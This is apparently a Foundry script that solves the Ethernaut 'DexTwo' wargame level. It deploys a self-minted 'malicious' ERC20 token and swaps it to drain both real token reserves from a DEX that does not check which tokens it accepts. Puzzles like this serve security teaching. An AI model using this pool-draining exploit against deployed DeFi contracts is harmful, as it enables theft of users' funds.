// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {DexTwo} from "../src/DexTwo.sol";
import {ERC20} from "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

// Malicious token to exploit DexTwo
contract MaliciousToken is ERC20 {
    constructor() ERC20("Malicious", "MAL") {
        _mint(msg.sender, 1000 ether);
    }
}

contract SolveDexTwo is Script {
    DexTwo public dex;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        dex = DexTwo(vm.envAddress("DEXTWO_ADDRESS"));
        address token1 = dex.token1();
        address token2 = dex.token2();

        MaliciousToken malToken = new MaliciousToken();

        malToken.transfer(address(dex), 1);

        malToken.approve(address(dex), type(uint256).max);

        uint256 dexToken1Balance = dex.balanceOf(token1, address(dex));
        uint256 dexToken2Balance = dex.balanceOf(token2, address(dex));

        dex.swap(address(malToken), token1, 1);

        dex.swap(address(malToken), token2, 2);

        vm.stopBroadcast();
    }
}
